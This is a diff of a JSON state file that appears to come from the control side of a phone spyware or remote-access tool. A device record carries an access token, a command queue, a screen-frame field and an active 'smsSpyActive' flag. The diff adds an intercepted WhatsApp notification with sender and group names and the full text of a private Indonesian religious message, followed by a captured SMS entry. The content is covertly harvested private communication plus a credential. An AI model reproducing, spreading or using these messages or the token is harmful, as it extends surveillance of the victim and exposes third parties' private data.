@@ -2181,7 +2181,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777768892955,
+    "lastSeen": 1777768907957,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2197,6 +2197,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎PP AZKHAL MUSTOFA CIKUDA (5 pesan): ~ MUSTOFA ARAFAT",
+        "content": "Boleh kah Berkurban sebelum Aqiqah?\n\nAda pertanyaan berikut ini. Ada seseorang yaitu waktu kecil belum sempat diaqiqah sampai sekarang usia sudah 29 tahun dan mempunyai keinginan untuk kurban. Apakah boleh kalau waktu kecil belum aqiqah saat sudah tua langsung melakukan kurban?.\n \n aqiqah adalah hewan yang disembelih atas kelahiran anak. Aqiqah disyariatkan di antaranya berdasarkan hadits riwayat Imam Al-Bukhari dari sahabat Salman bin Amir ad Dhabbi:   \n \nمَعَ الْغُلَامِ عَقِيقَةٌ فَأَهْرِيقُوا عَنْهُ دَمًا، وَأَمِيطُوا عَنْهُ الْأَذَى   \n \nArtinya: \"Beserta (kelahiran) anak (dianjurkan) aqiqah. Maka alirkanlah darah (hewan sembelihan) untuknya dan hilangkan kotoran darinya.\" (HR Al-Bukhari)   \n \nHikmah dan Hukum Aqiqah \nHikmah dianjurkan aqiqah adalah menampakkan kegembiraan atas nikmat mendapat anak dan mengenalkan nasab. (Amjad Rasyid, Al-Qaulul Mahmud fi Ahkamil Maulud, [Tarim, Darul Ilmi wad Dakwah: 2005], halaman 17).   \n \nAqiqah sendiri hukumnya sunnah muakkadah, tidak wajib. Ini berdasarkan hadit…",
+        "time": "03/05 07:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777768909322
+      },
       {
         "appName": "Messages",
         "sender": "myIM3",
